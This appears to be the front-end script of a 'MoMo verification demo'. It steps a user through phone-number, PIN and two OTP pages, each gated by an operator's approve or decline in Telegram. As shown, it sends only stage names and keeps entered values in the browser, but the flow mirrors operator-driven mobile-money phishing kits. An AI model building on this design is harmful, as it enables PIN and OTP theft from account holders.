// ========================================
// MoMo Verification Demo — script.js
// ========================================

let currentRef = null;
let currentStage = null;
let pollTimer = null;
let countdownTimer = null;
let reviewInProgress = false;

// Approval routing for each demo stage.
const stageOrder = {
  pin_demo: {
    approvedPage: "otp1Page",
    approvedStep: 5
  },

  otp1_demo: {
    approvedPage: "otp2Page",
    approvedStep: 6
  },

  otp2_demo: {
    approvedPage: "successPage",
    approvedStep: 7
  }
};

// ----------------------------------------
// Show a page and update the progress bar.
// ----------------------------------------

function show(pageId, step) {
  document.querySelectorAll(".page").forEach(page => {
    page.classList.remove("active");
  });

  const page = document.getElementById(pageId);

  if (page) {
    page.classList.add("active");
  }

  const stepNumber = document.getElementById("stepNumber");
  const progressBar = document.getElementById("progressBar");

  if (stepNumber) {
    stepNumber.textContent = `Step ${step} of 7`;
  }

  if (progressBar) {
    progressBar.style.width =
      `${Math.min(100, (step / 7) * 100)}%`;
  }
}

// ----------------------------------------
// Stop existing timers.
// ----------------------------------------

function stopTimers() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }

  if (countdownTimer) {
    clearInterval(countdownTimer);
    countdownTimer = null;
  }
}

// ----------------------------------------
// Request a Telegram demo review.
// Only the stage is transmitted.
// ----------------------------------------

async function requestReview(stage) {
  if (reviewInProgress) {
    return;
  }

  reviewInProgress = true;
  currentStage = stage;
  currentRef = null;

  const status = document.getElementById("reviewStatus");

  if (status) {
    status.textContent = "Requesting demo review...";
  }

  try {
    const response = await fetch("/api/demo-status", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        stage: stage
      })
    });

    const data = await response.json();

    if (!response.ok || !data.success || !data.reference) {
      throw new Error(
        data.error || "Could not create the demo review."
      );
    }

    currentRef = data.reference;

    if (status) {
      status.textContent =
        "Review requested. Waiting for Telegram approval or decline...";
    }

    // Keep waiting until the server reports a decision.
    watchReview(currentRef, stage);

  } catch (error) {
    console.error("Demo review error:", error);

    if (status) {
      status.textContent =
        "Could not contact the demo server. Check the server logs.";
    }

    reviewInProgress = false;
  }
}

// ----------------------------------------
// Check the decision for this exact review.
// ----------------------------------------

function watchReview(reference, stage) {
  if (pollTimer) {
    clearInterval(pollTimer);
  }

  pollTimer = setInterval(async () => {
    // Ignore results from an old review.
    if (
      currentRef !== reference ||
      currentStage !== stage
    ) {
      return;
    }

    try {
      const response = await fetch(
        `/api/demo-status/${encodeURIComponent(reference)}`,
        { cache: "no-store" }
      );

      if (!response.ok) {
        return;
      }

      const data = await response.json();

      if (data.status === "approved") {
        stopTimers();
        reviewInProgress = false;

        const next = stageOrder[stage];

        if (!next) {
          console.error("Unknown approved stage:", stage);
          return;
        }

        currentRef = null;
        currentStage = null;

        show(next.approvedPage, next.approvedStep);

        return;
      }

      if (data.status === "declined") {
        stopTimers();
        reviewInProgress = false;

        currentRef = null;
        currentStage = null;

        show("declinePage", 7);

        return;
      }

    } catch (error) {
      console.error("Could not check review status:", error);
    }
  }, 1500);
}

// ----------------------------------------
// Show the spinner and wait for a decision.
// ----------------------------------------

function startWait(stage) {
  if (reviewInProgress) {
    return;
  }

  stopTimers();

  show("loadingPage", 4);

  const secondsDisplay = document.getElementById("seconds");
  const status = document.getElementById("reviewStatus");

  if (status) {
    status.textContent =
      "Waiting for the demo reviewer in Telegram...";
  }

  let seconds = 5;

  if (secondsDisplay) {
    secondsDisplay.textContent = `${seconds}s`;
  }

  // This countdown changes the display only.
  // It does NOT advance the page automatically.
  countdownTimer = setInterval(() => {
    seconds--;

    if (secondsDisplay) {
      secondsDisplay.textContent =
        `${Math.max(0, seconds)}s`;
    }

    if (seconds <= 0) {
      clearInterval(countdownTimer);
      countdownTimer = null;

      if (status) {
        status.textContent =
          "Waiting for Approve Demo or Decline Demo in Telegram...";
      }
    }
  }, 1000);

  requestReview(stage);
}

// ----------------------------------------
// Welcome page.
// ----------------------------------------

const startBtn = document.getElementById("startBtn");

if (startBtn) {
  startBtn.addEventListener("click", () => {
    show("numberPage", 2);
  });
}

// ----------------------------------------
// Demo number page.
// The number stays in the browser.
// ----------------------------------------

const numberBtn = document.getElementById("numberBtn");

if (numberBtn) {
  numberBtn.addEventListener("click", () => {
    const numberInput = document.getElementById("demoNumber");

    if (numberInput && !numberInput.value.trim()) {
      numberInput.focus();
      return;
    }

    show("pinPage", 3);
  });
}

// ----------------------------------------
// Dummy PIN page.
// Automatically starts review on the last
// digit of the five-digit demo PIN.
// ----------------------------------------

const demoPin = document.getElementById("demoPin");

if (demoPin) {
  demoPin.addEventListener("input", () => {
    if (
      demoPin.value.length === 5 &&
      !reviewInProgress
    ) {
      startWait("pin_demo");
    }
  });
}

// ----------------------------------------
// OTP 1 demo page.
// The sample message/code stays in browser.
// ----------------------------------------

const otp1Btn = document.getElementById("otp1Btn");

if (otp1Btn) {
  otp1Btn.addEventListener("click", () => {
    startWait("otp1_demo");
  });
}

// ----------------------------------------
// OTP 2 demo page.
// ----------------------------------------

const otp2Btn = document.getElementById("otp2Btn");

if (otp2Btn) {
  otp2Btn.addEventListener("click", () => {
    startWait("otp2_demo");
  });
}

// ----------------------------------------
// Restart after completion or decline.
// ----------------------------------------

function resetDemo() {
  stopTimers();

  currentRef = null;
  currentStage = null;
  reviewInProgress = false;

  const demoNumber = document.getElementById("demoNumber");
  const demoPinInput = document.getElementById("demoPin");
  const demoOtp1 = document.getElementById("demoOtp1");
  const demoOtp2 = document.getElementById("demoOtp2");

  if (demoNumber) demoNumber.value = "";
  if (demoPinInput) demoPinInput.value = "";
  if (demoOtp1) demoOtp1.value = "";
  if (demoOtp2) demoOtp2.value = "";

  show("homePage", 1);
}

const restartSuccess = document.getElementById("restartSuccess");
const restartDecline = document.getElementById("restartDecline");

if (restartSuccess) {
  restartSuccess.addEventListener("click", resetDemo);
}

if (restartDecline) {
  restartDecline.addEventListener("click", resetDemo);
}
